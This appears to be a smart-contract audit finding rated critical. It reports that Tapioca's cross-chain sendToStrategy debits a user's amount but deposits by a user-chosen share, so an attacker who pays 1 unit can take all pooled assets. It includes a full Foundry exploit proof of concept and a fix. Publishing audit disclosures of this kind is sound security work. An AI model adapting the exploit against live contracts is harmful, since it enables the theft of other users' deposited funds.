---
id: 25665
severity: "Crit/High"
---

# All assets of (m)TapiocaOFT can be stealed by depositing to strategy cross chain call with 1 amount but maximum shares possible

## Description



## Proof of Concept

In `BaseTOFT`, `SendToStrategy()`, has no validation and just delegate calls to `sendToStrategy()` function of the `BaseTOFTStrategyModule`.

In the mentioned module, the quantity debited from the user is the `amount` argument, having no validation in the corresponding `share` amount:

```solidity
function sendToStrategy(
    address _from,
    address _to,
    uint256 amount,
    uint256 share,
    uint256 assetId,
    uint16 lzDstChainId,
    ICommonData.ISendOptions calldata options
) external payable {
    require(amount > 0, "TOFT_0");
    bytes32 toAddress = LzLib.addressToBytes32(_to);
    _debitFrom(_from, lzEndpoint.getChainId(), toAddress, amount);
    ...
```

Then, a payload is sent to the destination chain in `_lzSend()` of type `PT_YB_SEND_STRAT`.

Again, in `BaseTOFT`, the function `_nonBlockingLzReceive()` handles the received message and delegate calls to the `BaseTOFTStrategyModule`, function `strategyDeposit()`. In this, function, among other things, it delegate calls to `depositToYieldbox()`, of the same module:

```solidity
function depositToYieldbox(
    uint256 _assetId,
    uint256 _amount,
    uint256 _share,
    IERC20 _erc20,
    address _from,
    address _to
) public {
    _amount = _share > 0
        ? yieldBox.toAmount(_assetId, _share, false)
        : _amount;
    _erc20.approve(address(yieldBox), _amount);
    yieldBox.depositAsset(_assetId, _from, _to, _amount, _share);
}
```

The `_share` argument is the one the user initially provided in the source chain; however, the `_amount`, is computed from the `yieldBox` ratio, effectively overriding the specified `amount` in the source chain of `1`. This will credit funds to the attacker from other users that bridged assets through `(m)TapiocaOFT`.

The following POC in Foundry demonstrates how an attacker can be debited on the source chain an amount of `1` but call `depositAsset()` on the destination chain with an amount of `2e18`, the available in the `TapiocaOFT` contract.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTStrategyModule} from "contracts/tOFT/modules/BaseTOFTStrategyModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockYieldBox is Test {
    function depositAsset(
        uint256 assetId,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256, uint256) {}

    function toAmount(
        uint256,
        uint256 share,
        bool
    ) external pure returns (uint256 amount) {
        // real formula amount = share._toAmount(totalSupply[assetId], _tokenBalanceOf(assets[assetId]), roundUp);
        // assume ratio is 1:1
        return share;
    }
}

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 internal constant PT_YB_SEND_STRAT = 770;

    function test_POC_SendToStrategy_WithoutAllDebitedFrom() public {
        vm.createSelectFork("https://eth.llamarpc.com");

        address mockERC20_ = address(new ERC20("mockERC20", "MERC20"));

        address strategyModule_ = address(new BaseTOFTStrategyModule(address(LZ_ENDPOINT), address(0), IYieldBoxBase(address(2)), "SomeName", "SomeSymbol", 18, block.chainid));

        address mockYieldBox_ = address(new MockYieldBox());

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            mockERC20_,
            IYieldBoxBase(mockYieldBox_),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(strategyModule_),
            payable(address(3)),
            payable(address(4))
        );

        // some user wraps 2e18 mock erc20
        address user_ = makeAddr("user");
        deal(mockERC20_, user_, 2e18);
        vm.startPrank(user_);
        ERC20(mockERC20_).approve(address(tapiocaOft_), 2e18);
        tapiocaOft_.wrap(user_, user_, 2e18);
        vm.stopPrank();

        address attacker_ = makeAddr("attacker");
        deal(attacker_, 1e18); // lz fees

        address from_ = attacker_;
        address to_ = attacker_;
        uint256 amount_ = 1;
        uint256 share_ = 2e18; // steal all available funds in (m)Tapioca (only 1 user with 2e18)
        uint256 assetId_ = 1;
        uint16 lzDstChainId_ = 102;
        address zroPaymentAddress_ = address(0);
        ICommonData.ISendOptions memory options_ = ICommonData.ISendOptions(200_000, zroPaymentAddress_);

        tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_, abi.encodePacked(tapiocaOft_));

        // attacker is only debited 1 amount, but specifies 2e18 shares, a possibly much bigger corresponding amount
        deal(mockERC20_, attacker_, 1);
        vm.startPrank(attacker_);
        ERC20(mockERC20_).approve(address(tapiocaOft_), 1);
        tapiocaOft_.wrap(attacker_, attacker_, 1);
        tapiocaOft_.sendToStrategy{value: 1 ether}(from_, to_, amount_, share_, assetId_, lzDstChainId_, options_);
        vm.stopPrank();

        bytes memory lzPayload_ = abi.encode(
            PT_YB_SEND_STRAT,
            bytes32(uint256(uint160(from_))),
            attacker_,
            amount_,
            share_,
            assetId_,
            zroPaymentAddress_
        );

        // attacker was debited from 1 amount, but deposit sends an amount of 2e18
        vm.expectCall(address(mockYieldBox_), 0, abi.encodeCall(MockYieldBox.depositAsset, (assetId_, address(tapiocaOft_), attacker_, 2e18, 2e18)));

        vm.prank(LZ_ENDPOINT);
        tapiocaOft_.lzReceive(102, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
    }
}
```

## Recommendation

Given that it's impossible to fetch the `YieldBox` ratio in the source chain, it's best to stick with the amount only and remove the `share` argument in the cross chain `sendToStrategy()` function call.
